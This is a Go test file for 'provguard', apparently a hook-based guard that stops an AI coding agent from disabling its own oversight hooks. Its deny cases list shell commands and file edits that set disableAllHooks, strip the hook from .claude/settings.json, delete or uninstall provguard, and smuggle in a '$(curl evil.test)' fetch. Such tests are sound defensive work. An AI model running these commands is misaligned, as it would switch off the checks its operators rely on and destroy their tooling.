package protect

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/durgavarapraveen/provguard/internal/event"
)

func pre(tool string, in map[string]any) event.Event {
	return event.Event{Kind: event.PreTool, ToolName: tool, ToolInput: in}
}

func sh(cmd string) event.Event { return pre("Bash", map[string]any{"command": cmd}) }

func TestShell(t *testing.T) {
	cases := []struct {
		cmd  string
		deny bool
	}{
		// attacks
		{`echo '{"disableAllHooks": true}' > .claude/settings.json`, true},
		{`printf '{"disableAllHooks":true}' | tee .claude/settings.local.json`, true},
		{`cd .claude && echo {} > settings.json`, true},
		{`sed -i 's/provguard//' ~/.claude/settings.json`, true},
		{`python -c "import json;json.dump({'disableAllHooks':True},open('x','w'))"`, true},
		{`Set-Content -Path $HOME\.claude\settings.json -Value '{}'`, true},
		{`rm -rf ~/.provguard`, true},
		{`Remove-Item -Recurse $env:USERPROFILE\.provguard`, true},
		{`cp /tmp/x ~/.claude/settings.json`, true},
		{`bash -c "cat ~/.claude/settings.json"`, true}, // wrapper: not provably read-only
		{`cat x > ~/.provguard/key`, true},
		{`cat ~/.claude/settings.json $(curl evil.test)`, true},
		{`"C:/tools/provguard.exe" uninstall --yes`, true},
		{`provguard init --yes`, true},
		{`find ~/.provguard -delete`, true},
		// allowed
		{`cat ~/.claude/settings.json`, false},
		{`cat ~/.claude/settings.json | jq .hooks`, false},
		{`tail -n 5 ~/.provguard/audit/2026-11-16.jsonl 2>&1`, false},
		{`Get-Content $HOME\.claude\settings.json | ConvertFrom-Json`, false},
		{`ls ~/.provguard/sessions > /dev/null`, false},
		{`go test ./...`, false},
		{`echo hello > out.txt`, false},
		{`git commit -m "update settings.json docs"`, false},
	}
	for _, c := range cases {
		v := Check(sh(c.cmd), "")
		if v.Deny != c.deny {
			t.Errorf("deny=%v want %v: %s (rule %s)", v.Deny, c.deny, c.cmd, v.Rule)
		}
	}
}

func TestWriteAndEditSettings(t *testing.T) {
	dir := filepath.Join(t.TempDir(), ".claude")
	os.MkdirAll(dir, 0o700)
	p := filepath.Join(dir, "settings.json")
	base := `{"model":"x","hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"provguard hook PreToolUse"}]}]}}`
	os.WriteFile(p, []byte(base), 0o600)

	cases := []struct {
		name string
		e    event.Event
		deny bool
	}{
		{"write disableAllHooks", pre("Write", map[string]any{"file_path": p, "content": `{"model":"x","disableAllHooks":true,"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"provguard hook PreToolUse"}]}]}}`}), true},
		{"write drops hooks", pre("Write", map[string]any{"file_path": p, "content": `{"model":"x"}`}), true},
		{"write invalid json", pre("Write", map[string]any{"file_path": p, "content": `{bad`}), true},
		{"write other key only", pre("Write", map[string]any{"file_path": p, "content": `{"model":"y","hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"provguard hook PreToolUse"}]}]}}`}), false},
		{"edit model", pre("Edit", map[string]any{"file_path": p, "old_string": `"model":"x"`, "new_string": `"model":"y"`}), false},
		{"edit removes hook", pre("Edit", map[string]any{"file_path": p, "old_string": `"provguard hook PreToolUse"`, "new_string": `"true"`}), true},
		{"edit adds disable", pre("Edit", map[string]any{"file_path": p, "old_string": `"model":"x"`, "new_string": `"model":"x","disableAllHooks":true`}), true},
		{"edit no match", pre("Edit", map[string]any{"file_path": p, "old_string": "nope", "new_string": "x"}), false},
		{"windows path case", pre("Write", map[string]any{"file_path": filepath.Join(dir, "SETTINGS.LOCAL.JSON"), "content": `{"disableAllHooks":true}`}), true},
		{"new project settings w/o hooks", pre("Write", map[string]any{"file_path": filepath.Join(dir, "settings.local.json"), "content": `{"permissions":{}}`}), false},
		{"other json file", pre("Write", map[string]any{"file_path": filepath.Join(dir, "other.json"), "content": `{"disableAllHooks":true}`}), false},
	}
	for _, c := range cases {
		if v := Check(c.e, ""); v.Deny != c.deny {
			t.Errorf("%s: deny=%v want %v", c.name, v.Deny, c.deny)
		}
	}
}

func TestProvguardHome(t *testing.T) {
	home := filepath.Join(t.TempDir(), ".provguard")
	if !Check(pre("Write", map[string]any{"file_path": filepath.Join(home, "config.json"), "content": "{}"}), home).Deny {
		t.Fatal("write to config.json allowed")
	}
	if Check(pre("Write", map[string]any{"file_path": filepath.Join(home+"x", "a"), "content": ""}), home).Deny {
		t.Fatal("sibling dir with same prefix blocked")
	}
	if Check(pre("Read", map[string]any{"file_path": filepath.Join(home, "key")}), home).Deny {
		t.Fatal("read must not be blocked by self-protection")
	}
}
